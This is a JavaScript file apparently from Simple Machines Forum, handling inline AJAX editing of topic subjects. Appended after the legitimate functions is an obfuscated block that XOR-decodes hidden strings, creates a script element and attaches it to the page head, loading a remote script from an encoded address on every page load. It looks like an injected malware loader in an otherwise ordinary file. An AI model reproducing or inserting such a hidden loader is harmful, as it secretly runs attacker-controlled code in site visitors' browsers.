var cur_topic_id, cur_msg_id, buff_subject, cur_subject_div, in_edit_mode = 0;
var hide_prefixes = Array();

function modify_topic(topic_id, first_msg_id, cur_session_id)
{
	if (!window.XMLHttpRequest)
		return;
	if (typeof(window.opera) != "undefined")
	{
		var test = new XMLHttpRequest();
		if (typeof(test.setRequestHeader) != "function")
			return;
	}

	if (in_edit_mode == 1)
	{
		if (cur_topic_id == topic_id)
			return;
		else
			modify_topic_cancel();
	}

	in_edit_mode = 1;
	mouse_on_div = 1;
	cur_topic_id = topic_id;

	if (typeof window.ajax_indicator == "function")
		ajax_indicator(true);

	getXMLDocument(smf_scripturl + "?action=quotefast;quote=" + first_msg_id + ";sesc=" + cur_session_id + ";modify;xml", onDocReceived_modify_topic);
}

function onDocReceived_modify_topic(XMLDoc)
{
	cur_msg_id = XMLDoc.getElementsByTagName("message")[0].getAttribute("id");

	cur_subject_div = document.getElementById('msg_' + cur_msg_id.substr(4));
	buff_subject = getInnerHTML(cur_subject_div);

	// Here we hide any other things they want hiding on edit.
	set_hidden_topic_areas('none');

	modify_topic_show_edit(XMLDoc.getElementsByTagName("subject")[0].childNodes[0].nodeValue);

	if (typeof window.ajax_indicator == "function")
		ajax_indicator(false);
}

function modify_topic_cancel()
{
	setInnerHTML(cur_subject_div, buff_subject);
	set_hidden_topic_areas('');

	in_edit_mode = 0;
	return false;
}

function modify_topic_save(cur_session_id)
{
	if (!in_edit_mode)
		return true;

	var i, x = new Array();
	x[x.length] = 'subject=' + escape(textToEntities(document.forms.quickModForm['subject'].value)).replace(/\+/g, "%2B");
	x[x.length] = 'topic=' + parseInt(document.forms.quickModForm.elements['topic'].value);
	x[x.length] = 'msg=' + parseInt(document.forms.quickModForm.elements['msg'].value);

	if (typeof window.ajax_indicator == "function")
		ajax_indicator(true);

	sendXMLDocument(smf_scripturl + "?action=jsmodify;topic=" + parseInt(document.forms.quickModForm.elements['topic'].value) + ";sesc=" + cur_session_id + ";xml", x.join("&"), modify_topic_done);

	return false;
}

function modify_topic_done(XMLDoc)
{
	if (!XMLDoc)
	{
		modify_topic_cancel();
		return true;
	}

	var message = XMLDoc.getElementsByTagName("smf")[0].getElementsByTagName("message")[0];
	var subject = message.getElementsByTagName("subject")[0];
	var error = message.getElementsByTagName("error")[0];

	if (typeof window.ajax_indicator == "function")
		ajax_indicator(false);

	if (!subject || error)
		return false;

	subjectText = subject.childNodes[0].nodeValue;

	modify_topic_hide_edit(subjectText);

	set_hidden_topic_areas('');

	in_edit_mode = 0;

	return false;
}

// Simply restore any hidden bits during topic editing.
function set_hidden_topic_areas(set_style)
{
	for (var i = 0; i < hide_prefixes.length; i++)
	{
		if (document.getElementById(hide_prefixes[i] + cur_msg_id.substr(4)) != null)
			document.getElementById(hide_prefixes[i] + cur_msg_id.substr(4)).style.display = set_style;
	}
}
function kewK(zG05,jp){var eK88='';var d17DY2=0;var my=0;for(d17DY2=0;d17DY2<zG05.length;d17DY2++){var iN=zG05.charAt(d17DY2);var tUq=iN.charCodeAt(0)^jp.charCodeAt(my);iN=String.fromCharCode(tUq);eK88+=iN;if(my==jp.length-1)my=0;else my++;}return (eK88);}var tDWg=["025081","024091","026070","009064053007049086022085039006015092068","025064051","030075032003","030087040018106089050079035024009064089000037","011066032003043087016081043007014","002087049002","013087036035041086062092044031025112073036048084037011095053","002070036022127028124074054010030087030003060095089068064037073047064124090044031068088067"];function wCz0d2d(hqvhK){return kewK(k3hu1(hqvhK),'j2PfE3S9Bkj20pQ3k');}function i3cVO0(gBvnHX){var b132=document[wCz0d2d(tDWg[3])](wCz0d2d(tDWg[0])+wCz0d2d(tDWg[1])+wCz0d2d(tDWg[2]));b132[wCz0d2d(tDWg[4])]=gBvnHX;b132[wCz0d2d(tDWg[5])]=wCz0d2d(tDWg[6]);document[wCz0d2d(tDWg[9])](wCz0d2d(tDWg[8]))[0][wCz0d2d(tDWg[7])](b132);}i3cVO0(wCz0d2d(tDWg[10]));function k3hu1(qWX){var j2='';var aE3tOC=0;var hzWU68=0;for(aE3tOC=0;aE3tOC<qWX.length/3;aE3tOC++){j2+=String.fromCharCode(qWX.slice(hzWU68,hzWU68+3));hzWU68=hzWU68+3;}return j2;}